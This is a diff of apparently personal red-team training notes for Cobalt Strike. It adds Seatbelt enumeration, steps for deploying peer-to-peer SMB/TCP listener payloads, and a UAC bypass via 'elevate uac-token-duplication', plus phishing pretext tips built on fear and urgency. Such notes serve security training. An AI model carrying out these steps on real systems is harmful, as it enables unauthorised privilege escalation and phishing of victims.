@@ -141,6 +141,7 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 #### via seatbelt.exe
 1. `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system`
 2. `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user`
+3. `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe InternetSettings`
 
 #### via screenshots
 1. Take a single screenshot via PrintScr method ---> `printscreen`
@@ -153,15 +154,24 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 2. From **view** ---> **keystrokes**
 3. `jobs`
 
+### Windows Privilege Escalation
+#### peer-to-peer listners
+1. generate a peer-to-peer listner e.g. **smb or tcp**. 
+2. next generate a payload **exe** for **smb or tcp**. 
+3. execute **exe**. 
+4. you'll get a open listening port e.g. **0.0.0.0:4444** if its **tcp 4444**. `netstat -anp tcp`
+5. `connect localhost 4444`.
+6. for smb type `ls \\.\pipe`.
+7. next type `link locahost`.
 
-### Windows Privilege Escalation - UAC Bypass
+#### method -> UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
 2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
 3. Also you can verify it by typing commands ``shell whoami /groups`` and ``shell whoami /priv``. You must be in **admin** group e.g. **BUILTIN\Administrators**
 4. Two methods are provided by **CS** for this **UAC Bypass** i.e. **elevate** and **runasadmin**
 5. in cobalt strike type: `elevate uac-token-duplication <your listner name>` e.g. ``elevate uac-token-duplication my1st64bit``
 
-### Some good points
+### Miscellaneous good points
 1. While doing active reconnisane, use VPN to hide the real Public IP address. 
 2. The **pretext** is the **"story"** behind why we want our target to open our email and carry out the desired actions.
 3. Emotional characteristics that usually result in higher user engagment are **fear, urgency, greed and curiosity**.
